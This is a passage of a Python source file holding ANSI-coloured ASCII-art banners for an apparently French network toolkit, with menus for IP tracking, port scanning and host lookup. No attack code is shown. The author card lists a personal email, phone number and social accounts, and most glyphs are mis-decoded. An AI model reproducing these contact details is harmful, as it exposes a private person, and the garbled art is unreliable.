‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë\033[1;94m      ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë   \n\033[1;91m   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù\033[1;91m      ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù                                                                      """)
logo_menu_clavier =("""\033[1;92m___  ___                 \033[1;95m  _____ _             _           \n\033[1;92m|  \/  |                 \033[1;95m /  __ \ |           (_)          \n\033[1;92m| .  . | ___ _ __  _   _ \033[1;95m | /  \/ | __ ___   ___  ___ _ __ \n\033[1;92m| |\/| |/ _ \ '_ \| | | |\033[1;95m | |   | |/ _` \ \ / / |/ _ \ '__|\n\033[1;92m| |  | |  __/ | | | |_| |\033[1;95m | \__/\ | (_| |\ V /| |  __/ |   \n\033[1;92m\_|  |_/\___|_| |_|\__,_|\033[1;95m  \____/_|\__,_| \_/ |_|\___|_|                                                                                                                        """)
logo_faxel =("""\033[1;97m‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó\n\033[1;97m‚ïë           \033[38;5;241mDevelopper par\033[1;91m : \033[1;93mMr \033[1;96mFaxel            \033[1;97m‚ïë\n\033[1;97m‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£\n\033[1;97m‚ïë                \033[1;94mYoutube\033[1;91m : \033[1;92mFASTER AXEL           \033[1;97m‚ïë\n\033[1;97m‚ïë           \033[1;94mWhatsapp\033[1;91m : \033[1;93m00225-557-09610           \033[1;97m‚ïë\n\033[1;97m‚ïë    \033[1;94mFacebook\033[1;91m : \033[1;95mhttps://www.facebook.com/Faxel19 \033[1;97m‚ïë\n\033[1;97m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù""")
loading =("""\033[1;95mChargement\033[1;97m |‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ‚ñÅ| \n\033[1;95mChargement\033[1;97m |‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ‚ñÇ| \n\033[1;95mChargement\033[1;91m |‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ‚ñÉ| \n\033[1;95mChargement\033[1;91m |‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ| \n\033[1;95mChargement\033[1;93m |‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ‚ñÖ| \n\033[1;95mChargement\033[1;93m |‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ‚ñÜ| \n\033[1;95mChargement\033[1;94m |‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá‚ñá| \n\033[1;95mChargement\033[1;96m |‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| [92mTerminer""")
key_complet =("""\033[1;92m‚ñë‚ñà‚îÄ‚ñÑ‚ñÄ ‚ñà‚ñÄ‚ñÄ ‚ñà‚îÄ‚îÄ‚ñà „ÄÄ\033[1;96m‚ñà‚ñÄ‚ñÄ ‚ñà‚ñÄ‚ñÄ‚ñà ‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà ‚ñà‚ñÄ‚ñÄ‚ñà ‚ñà‚îÄ‚îÄ ‚ñà‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÄ \n\033[1;92m‚ñë‚ñà‚ñÄ‚ñÑ‚îÄ ‚ñà‚ñÄ‚ñÄ ‚ñà‚ñÑ‚ñÑ‚ñà „ÄÄ\033[1;96m‚ñà‚îÄ‚îÄ ‚ñà‚îÄ‚îÄ‚ñà ‚ñà‚îÄ‚ñÄ‚îÄ‚ñà ‚ñà‚îÄ‚îÄ‚ñà ‚ñà‚îÄ‚îÄ ‚ñà‚ñÄ‚ñÄ ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ \n\033[1;92m‚ñë‚ñà‚îÄ‚ñë‚ñà ‚ñÄ‚ñÄ‚ñÄ ‚ñÑ‚ñÑ‚ñÑ‚ñà „ÄÄ\033[1;96m‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚îÄ‚îÄ‚îÄ‚ñÄ ‚ñà‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ ‚îÄ‚îÄ‚ñÄ‚îÄ‚îÄ""")
key_simple =("""\033[1;92m‚ñë‚ñà‚îÄ‚ñÑ‚ñÄ ‚ñà‚ñÄ‚ñÄ ‚ñà‚îÄ‚îÄ‚ñà  \033[1;91m‚ñà‚ñÄ‚ñÄ ‚îÄ‚ñÄ‚îÄ ‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà ‚ñà‚ñÄ‚ñÄ‚ñà ‚ñà‚îÄ‚îÄ ‚ñà‚ñÄ‚ñÄ \n\033[1;92m‚ñë‚ñà‚ñÄ‚ñÑ‚îÄ ‚ñà‚ñÄ‚ñÄ ‚ñà‚ñÑ‚ñÑ‚ñà  \033[1;91m‚ñÄ‚ñÄ‚ñà ‚ñÄ‚ñà‚ñÄ ‚ñà‚îÄ‚ñÄ‚îÄ‚ñà ‚ñà‚îÄ‚îÄ‚ñà ‚ñà‚îÄ‚îÄ ‚ñà‚ñÄ‚ñÄ \n\033[1;92m‚ñë‚ñà‚îÄ‚ñë‚ñà ‚ñÄ‚ñÄ‚ñÄ ‚ñÑ‚ñÑ‚ñÑ‚ñà  \033[1;91m‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚îÄ‚îÄ‚îÄ‚ñÄ ‚ñà‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ""")
key_semi =("""\033[1;92m‚ñë‚ñà‚îÄ‚ñÑ‚ñÄ ‚ñà‚ñÄ‚ñÄ ‚ñà‚îÄ‚îÄ‚ñà „ÄÄ\033[1;94m‚ñà‚ñÄ‚ñÄ ‚ñà‚ñÄ‚ñÄ ‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà ‚îÄ‚ñÄ‚îÄ \n\033[1;92m‚ñë‚ñà‚ñÄ‚ñÑ‚îÄ ‚ñà‚ñÄ‚ñÄ ‚ñà‚ñÑ‚ñÑ‚ñà „ÄÄ\033[1;94m‚ñÄ‚ñÄ‚ñà ‚ñà‚ñÄ‚ñÄ ‚ñà‚îÄ‚ñÄ‚îÄ‚ñà ‚ñÄ‚ñà‚ñÄ \n\033[1;92m‚ñë‚ñà‚îÄ‚ñë‚ñà ‚ñÄ‚ñÄ‚ñÄ ‚ñÑ‚ñÑ‚ñÑ‚ñà „ÄÄ\033[1;94m‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚îÄ‚îÄ‚îÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ""")	
Auteur_information =("""\033[38;5;241m                    MES INFORMATIONS \n\033[1;97m‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó \n\033[1;97m‚ïë\033[1;96m Auteur   \033[38;5;214mMr Faxel                                 \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Nom      \033[1;97mEncodage/decodage base quelconque        \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Date     \033[1;97m03/08/2020                               \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Facebook \033[1;97mFaxel Koua                               \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Email    \033[1;97mFaxelh19@gmail.com                       \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Whatsapp \033[1;93m+22555709610                             \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Github   \033[1;97mhttps://github.com/Phantom-19/           \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Gitlab   \033[1;97mhttps://gitlab.com/Faxel/                \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Blog     \033[1;97mhttps://faxelh.blogspot.com/             \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Youtube  \033[1;97mFASTER AXEL                              \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Skyrock  \033[1;97mFaxel                                    \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Twitter  \033[1;97m@Faxel2020                               \033[1;97m‚ïë\n\033[1;97m‚ïë\033[1;96m Pinterest\033[1;97mhttps://www.pinterest.com/kouadioantoinea\033[1;97m‚ïë     \n\033[1;97m‚ïë\033[1;96m Pastebin \033[1;91mhttps://pastebin.com/u/Faxel             \033[1;97m‚ïë\n\033[1;97m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù""")
Auteur =("""\033[38;5;214m‚îÄ‚ñà‚ñÄ‚ñÄ‚ñà ‚ñà‚îÄ‚îÄ‚ñà \033[1;97m‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÄ ‚ñà‚ñÄ‚ñÄ \033[1;92m‚ñà‚îÄ‚îÄ‚ñà ‚ñà‚ñÄ‚ñÄ‚ñà \n\033[38;5;214m‚ñë‚ñà‚ñÑ‚ñÑ‚ñà ‚ñà‚îÄ‚îÄ‚ñà \033[1;97m‚îÄ‚îÄ‚ñà‚îÄ‚îÄ ‚ñà‚ñÄ‚ñÄ \033[1;92m‚ñà‚îÄ‚îÄ‚ñà ‚ñà‚ñÑ‚ñÑ‚ñÄ \n\033[38;5;214m‚ñë‚ñà‚îÄ‚ñë‚ñà ‚îÄ‚ñÄ‚ñÄ‚ñÄ \033[1;97m‚îÄ‚îÄ‚ñÄ‚îÄ‚îÄ ‚ñÄ‚ñÄ‚ñÄ\033[1;92m ‚îÄ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚îÄ‚ñÄ‚ñÄ""")
logo_verif_robot =("""\033[1;97m          ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó \n\033[1;97m          ‚ïë\033[38;5;214m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà\033[1;97m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà\033[1;92m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà100%\033[1;97m‚ïë\n\033[1;97m          ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù""")
logo_menu_ip =("""\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n\033[38;5;214m ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó \033[1;97m   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó \033[1;32m ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó  \n\033[38;5;214m ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\033[1;97m   ‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\033[1;32m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù \n\033[38;5;214m ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\033[1;97m‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\033[1;32m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù   \n\033[38;5;214m ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù \033[1;97m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\033[1;32m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó   \n\033[38;5;214m ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     \033[1;97m      ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\033[1;32m‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó   \n\033[38;5;214m ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     \033[1;97m      ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù\033[1;32m‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù                                                      \n\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè""")
logo_mon_ip =("""\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n\033[38;5;214m‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà\033[1;97m‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó \033[1;32m  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó \n\033[38;5;214m‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê\033[1;97m‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë \033[1;32m  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\n\033[38;5;214m‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë \033[1;97m  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë \033[1;32m  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\n\033[38;5;214m‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë \033[1;97m  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë \033[1;32m  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù \n\033[38;5;214m‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà\033[1;97m‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë \033[1;32m  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     \n\033[38;5;214m‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê\033[1;97m‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù \033[1;32m  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     \n\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè                                             """)
logo_portes =("""\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n\033[38;5;214m‚óè___  ____ ____\033[1;97m ___ ____ ____\033[1;32m    ___  _   _‚óè \n\033[38;5;214m‚óè|__] |  | |__/\033[1;97m  |  |___ [__ \033[1;32m __ |__]  \_/ ‚óè \n\033[38;5;214m‚óè|    |__| |  \033[1;97m\  |  |___ ___]\033[1;32m    |      |  ‚óè \n\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè                                           """)
logo_auditeur =("""\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n\033[38;5;214m‚óè ____ _  _\033[1;97m ___  _ ___ ____ \033[1;32m_  _ ____ ____ ‚óè\n\033[38;5;214m‚óè |__| |  |\033[1;97m |  \ |  |  |___ \033[1;32m|  | |__/ [__  ‚óè\n\033[38;5;214m‚óè |  | |__|\033[1;97m |__/ |  |  |___ \033[1;32m|__| |  \ ___] ‚óè\n\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè""")
logo_hote =("""\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë‚óè‡πë€©\033[1;97m€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n\033[38;5;214m‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà\033[1;97m‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà\033[1;32m‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó\n\033[38;5;214m‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê\033[1;97m‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ñà\033[1;32m‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù\n\033[38;5;214m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë \033[1;97m  ‚ñà‚ñà‚ïë   ‚ñà‚ñà\033[1;32m‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  \n\033[38;5;214m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë \033[1;97m  ‚ñà‚ñà‚ïë   ‚ñà\033[1;32m‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  \n\033[38;5;214m‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà\033[1;97m‚ñà‚ñà‚ñà‚ïî‚ïù   ‚ñà\033[1;32m‚ñà‚ïë   